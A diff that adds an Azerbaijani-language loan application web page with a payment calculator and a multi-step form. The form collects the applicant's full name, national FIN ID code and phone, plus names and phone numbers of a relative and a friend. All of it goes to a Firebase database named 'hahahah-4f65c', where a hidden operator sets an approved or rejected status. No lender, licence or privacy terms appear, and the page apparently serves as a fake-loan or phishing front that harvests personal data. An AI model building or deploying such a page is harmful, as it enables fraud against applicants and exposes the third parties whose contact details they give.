@@ -1,0 +1,524 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kredit Müraciət Portalı</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            padding: 20px;
+        }
+        .header {
+            max-width: 900px;
+            margin: 0 auto 20px auto;
+            background: #1a365d;
+            color: white;
+            padding: 20px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h1 {
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .step-indicator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #e2e8f0;
+            z-index: 1;
+            transform: translateY(-50%);
+        }
+        .step-item {
+            position: relative;
+            z-index: 2;
+            background: white;
+            padding: 0 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #94a3b8;
+        }
+        .step-item.active {
+            color: #2563eb;
+        }
+        .step-item.completed {
+            color: #16a34a;
+        }
+        .step-number {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+        }
+        .step-item.active .step-number {
+            background: #2563eb;
+            color: white;
+        }
+        .step-item.completed .step-number {
+            background: #16a34a;
+            color: white;
+        }
+
+        .step-content {
+            display: none;
+        }
+        .step-content.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.95rem;
+            color: #334155;
+        }
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #cbd5e1;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.2s;
+        }
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: #2563eb;
+        }
+
+        .range-container {
+            background: #f8fafc;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #e2e8f0;
+            margin-bottom: 20px;
+        }
+        .range-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        .range-slider {
+            width: 100%;
+            height: 8px;
+            border-radius: 5px;
+            background: #cbd5e1;
+            outline: none;
+            accent-color: #2563eb;
+        }
+
+        .calc-summary {
+            background: #eff6ff;
+            border: 1px solid #bfdbfe;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            text-align: center;
+        }
+        .calc-card h4 {
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-bottom: 5px;
+        }
+        .calc-card p {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #1e3a8a;
+        }
+
+        .btn-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            gap: 15px;
+        }
+        .btn {
+            padding: 12px 25px;
+            border-radius: 8px;
+            border: none;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            flex: 1;
+        }
+        .btn-primary {
+            background: #2563eb;
+            color: white;
+        }
+        .btn-primary:hover {
+            background: #1d4ed8;
+        }
+        .btn-secondary {
+            background: #e2e8f0;
+            color: #475569;
+        }
+        .btn-secondary:hover {
+            background: #cbd5e1;
+        }
+
+        /* Loading Overlay */
+        .loader-overlay {
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2563eb;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status-badge {
+            display: inline-block;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            margin-top: 15px;
+        }
+        .status-pending { background: #fef3c7; color: #b45309; }
+        .status-approved { background: #dcfce7; color: #15803d; }
+        .status-rejected { background: #fee2e2; color: #b91c1c; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Sürətli Kredit Portalı</h1>
+    <span>Onlayn Müraciət</span>
+</div>
+
+<div class="container">
+    <div class="step-indicator">
+        <div class="step-item active" id="ind-step1">
+            <div class="step-number">1</div>
+            <span>Kredit Hesablanması</span>
+        </div>
+        <div class="step-item" id="ind-step2">
+            <div class="step-number">2</div>
+            <span>Şəxsi Məlumatlar</span>
+        </div>
+        <div class="step-item" id="ind-step3">
+            <div class="step-number">3</div>
+            <span>Əlaqəli Şəxslər</span>
+        </div>
+        <div class="step-item" id="ind-step4">
+            <div class="step-number">4</div>
+            <span>Nəticə</span>
+        </div>
+    </div>
+
+    <!-- PƏNCƏRƏ 1: MƏBLƏĞ VƏ MÜDDƏT SEÇİMİ -->
+    <div class="step-content active" id="step1">
+        <h2 style="margin-bottom: 20px; font-size: 1.25rem;">Kredit Şərtlərini Seçin</h2>
+        
+        <div class="range-container">
+            <div class="range-header">
+                <span>Kredit Məbləği:</span>
+                <span id="amount-val" style="color:#2563eb; font-size:1.1rem;">3000 AZN</span>
+            </div>
+            <input type="range" class="range-slider" id="amount-slider" min="300" max="20000" step="100" value="3000" oninput="updateCalc()">
+        </div>
+
+        <div class="range-container">
+            <div class="range-header">
+                <span>Kredit Müddəti:</span>
+                <span id="month-val" style="color:#2563eb; font-size:1.1rem;">12 Ay</span>
+            </div>
+            <input type="range" class="range-slider" id="month-slider" min="3" max="48" step="1" value="12" oninput="updateCalc()">
+        </div>
+
+        <div class="calc-summary">
+            <div class="calc-card">
+                <h4>Aylıq Ödəniş</h4>
+                <p><span id="calc-monthly">0</span> AZN</p>
+            </div>
+            <div class="calc-card">
+                <h4>İllik Faiz</h4>
+                <p>14%</p>
+            </div>
+            <div class="calc-card">
+                <h4>Cəmi Ödəniləcək</h4>
+                <p><span id="calc-total">0</span> AZN</p>
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <div></div>
+            <button class="btn btn-primary" onclick="goToStep(2)">Növbəti Adım &rarr;</button>
+        </div>
+    </div>
+
+    <!-- PƏNCƏRƏ 2: ŞƏXSİ MƏLUMATLAR -->
+    <div class="step-content" id="step2">
+        <h2 style="margin-bottom: 20px; font-size: 1.25rem;">Şəxsi Məlumatlarınız</h2>
+        
+        <div class="form-group">
+            <label>Ad və Soyad</label>
+            <input type="text" id="cust-fullname" placeholder="Məs: Əli Məmmədov">
+        </div>
+
+        <div class="form-group">
+            <label>FIN Kod (Şəxsiyyət vəsəqəsinin 7 simvolu)</label>
+            <input type="text" id="cust-fin" maxlength="7" style="text-transform: uppercase;" placeholder="7 simvol">
+        </div>
+
+        <div class="form-group">
+            <label>Mobil Telefon Nömrəniz</label>
+            <input type="tel" id="cust-phone" placeholder="0501234567">
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-secondary" onclick="goToStep(1)">&larr; Geri</button>
+            <button class="btn btn-primary" onclick="validateAndGoStep3()">Növbəti Adım &rarr;</button>
+        </div>
+    </div>
+
+    <!-- PƏNCƏRƏ 3: QOHUM VƏ DOST/TANIŞ NÖMRƏLƏRİ -->
+    <div class="step-content" id="step3">
+        <h2 style="margin-bottom: 10px; font-size: 1.25rem;">Əlaqəli Şəxs Məlumatları</h2>
+        <p style="color: #64748b; font-size: 0.9rem; margin-bottom: 20px;">Müraciətinizin təsdiqlənməsi üçün zəhmət olmasa yaxınlarınızın əlaqə nömrələrini daxil edin.</p>
+
+        <div style="background: #f8fafc; padding:15px; border-radius:8px; border:1px solid #e2e8f0; margin-bottom:20px;">
+            <h3 style="font-size:1rem; margin-bottom:12px; color:#1e293b;">1. Qohum Nömrəsi</h3>
+            <div class="form-group">
+                <label>Qohumluq Əlaqəsi</label>
+                <select id="rel1-type">
+                    <option value="Valideyn (Ata/Ana)">Valideyn (Ata/Ana)</option>
+                    <option value="Bacı/Qardaş">Bacı/Qardaş</option>
+                    <option value="Həyat Yoldaşı">Həyat Yoldaşı</option>
+                    <option value="Uşaq">Uşaq</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Qohumun Adı, Soyadı</label>
+                <input type="text" id="rel1-name" placeholder="Məs: Həsən Məmmədov">
+            </div>
+            <div class="form-group">
+                <label>Qohumun Telefon Nömrəsi</label>
+                <input type="tel" id="rel1-phone" placeholder="0507654321">
+            </div>
+        </div>
+
+        <div style="background: #f8fafc; padding:15px; border-radius:8px; border:1px solid #e2e8f0;">
+            <h3 style="font-size:1rem; margin-bottom:12px; color:#1e293b;">2. Dost / Tanış Nömrəsi</h3>
+            <div class="form-group">
+                <label>Əlaqə Növü</label>
+                <select id="rel2-type">
+                    <option value="Dost">Dost</option>
+                    <option value="İş Yoldaşı">İş Yoldaşı</option>
+                    <option value="Qonşu">Qonşu</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label>Dost/Tanışın Adı, Soyadı</label>
+                <input type="text" id="rel2-name" placeholder="Məs: Vüsal Qasımov">
+            </div>
+            <div class="form-group">
+                <label>Dost/Tanışın Telefon Nömrəsi</label>
+                <input type="tel" id="rel2-phone" placeholder="0559876543">
+            </div>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn btn-secondary" onclick="goToStep(2)">&larr; Geri</button>
+            <button class="btn btn-primary" onclick="submitApplication()" style="background:#10b981;">Müraciəti Tamamla &rarr;</button>
+        </div>
+    </div>
+
+    <!-- PƏNCƏRƏ 4: YOXLANILIR VƏ NƏTİCƏ SƏHİFƏSİ -->
+    <div class="step-content" id="step4">
+        <div class="loader-overlay" id="checking-state">
+            <div class="spinner"></div>
+            <h3>Şərtlər və məlumatlar yoxlanılır...</h3>
+            <p style="color: #64748b; margin-top: 10px;">Zəhmət olmasa gözləyin, sorğunuz təhlil edilir.</p>
+        </div>
+
+        <div id="final-state" style="display: none; text-align: center; padding: 20px;">
+            <h2 id="res-title">Müraciətinizin Statusu</h2>
+            <div id="res-badge" class="status-badge status-pending">Şərtlər Yoxlanılır</div>
+            <p id="res-msg" style="margin-top: 20px; color: #475569; line-height: 1.6;">
+                Müraciətiniz qəbul olundu. Tezliklə operatorlarımız sizinlə və göstərdiyiniz əlaqəli şəxslərlə əlaqə saxlayacaqlar.
+            </p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // FIREBASE INITIALIZATION
+    const firebaseConfig = {
+        databaseURL: "https://hahahah-4f65c-default-rtdb.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    let currentAppId = null;
+
+    function updateCalc() {
+        let amount = parseInt(document.getElementById('amount-slider').value);
+        let months = parseInt(document.getElementById('month-slider').value);
+
+        document.getElementById('amount-val').innerText = amount + " AZN";
+        document.getElementById('month-val').innerText = months + " Ay";
+
+        let r = (14 / 100) / 12;
+        let monthly = (amount * (r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1)).toFixed(2);
+        let total = (monthly * months).toFixed(2);
+
+        document.getElementById('calc-monthly').innerText = monthly;
+        document.getElementById('calc-total').innerText = total;
+    }
+
+    function goToStep(stepNum) {
+        document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
+        document.getElementById('step' + stepNum).classList.add('active');
+
+        for(let i = 1; i <= 4; i++) {
+            let ind = document.getElementById('ind-step' + i);
+            ind.classList.remove('active', 'completed');
+            if(i === stepNum) ind.classList.add('active');
+            else if(i < stepNum) ind.classList.add('completed');
+        }
+    }
+
+    function validateAndGoStep3() {
+        let fullname = document.getElementById('cust-fullname').value.trim();
+        let fin = document.getElementById('cust-fin').value.trim();
+        let phone = document.getElementById('cust-phone').value.trim();
+
+        if(!fullname || !fin || !phone) {
+            alert('Zəhmət olmasa bütün şəxsi məlumatları doldurun!');
+            return;
+        }
+        goToStep(3);
+    }
+
+    function submitApplication() {
+        let rel1Name = document.getElementById('rel1-name').value.trim();
+        let rel1Phone = document.getElementById('rel1-phone').value.trim();
+        let rel2Name = document.getElementById('rel2-name').value.trim();
+        let rel2Phone = document.getElementById('rel2-phone').value.trim();
+
+        if(!rel1Name || !rel1Phone || !rel2Name || !rel2Phone) {
+            alert('Zəhmət olmasa qohum və dost/tanış məlumatlarını tam daxil edin!');
+            return;
+        }
+
+        goToStep(4);
+
+        let amount = document.getElementById('amount-slider').value;
+        let months = document.getElementById('month-slider').value;
+        let monthly = document.getElementById('calc-monthly').innerText;
+        let fullname = document.getElementById('cust-fullname').value;
+        let fin = document.getElementById('cust-fin').value.toUpperCase();
+        let phone = document.getElementById('cust-phone').value;
+
+        let rel1Type = document.getElementById('rel1-type').value;
+        let rel2Type = document.getElementById('rel2-type').value;
+
+        let appData = {
+            fullname: fullname,
+            fin: fin,
+            phone: phone,
+            amount: amount,
+            months: months,
+            monthly: monthly,
+            rel1: { type: rel1Type, name: rel1Name, phone: rel1Phone },
+            rel2: { type: rel2Type, name: rel2Name, phone: rel2Phone },
+            status: "Şərtlər yoxlanılır",
+            timestamp: new Date().toISOString()
+        };
+
+        // Firebase-ə yazılır
+        let newRef = db.ref('kredit_muraciətləri').push();
+        currentAppId = newRef.key;
+        newRef.set(appData);
+
+        // Canlı dinləyici (Admin panel nə seçsə dərhal dəyişəcək)
+        db.ref('kredit_muraciətləri/' + currentAppId).on('value', (snapshot) => {
+            let data = snapshot.val();
+            if(!data) return;
+
+            if(data.status !== "Şərtlər yoxlanılır") {
+                document.getElementById('checking-state').style.display = 'none';
+                document.getElementById('final-state').style.display = 'block';
+
+                let badge = document.getElementById('res-badge');
+                let msg = document.getElementById('res-msg');
+
+                badge.className = 'status-badge ';
+                if(data.status === 'Təsdiqləndi') {
+                    badge.classList.add('status-approved');
+                    badge.innerText = 'TƏSDİQLƏNDİ';
+                    msg.innerHTML = 'Təbriklər! Kredit müraciətiniz <b>təsdiqləndi</b>. Yaxın dəqiqələrdə sizinlə əlaqə saxlanılacaq.';
+                } else if(data.status === 'İmtina edildi') {
+                    badge.classList.add('status-rejected');
+                    badge.innerText = 'İMTİNA EDİLDİ';
+                    msg.innerHTML = 'Təəssüf ki, müraciətinizə <b>imtina verildi</b>. Ətraflı məlumat üçün dəstək xidməti ilə əlaqə saxlayın.';
+                } else {
+                    badge.classList.add('status-pending');
+                    badge.innerText = data.status;
+                    msg.innerText = 'Müraciət statusu: ' + data.status;
+                }
+            }
+        });
+    }
+
+    // İlk hesablama
+    updateCalc();
+</script>
+
+</body>
+</html>
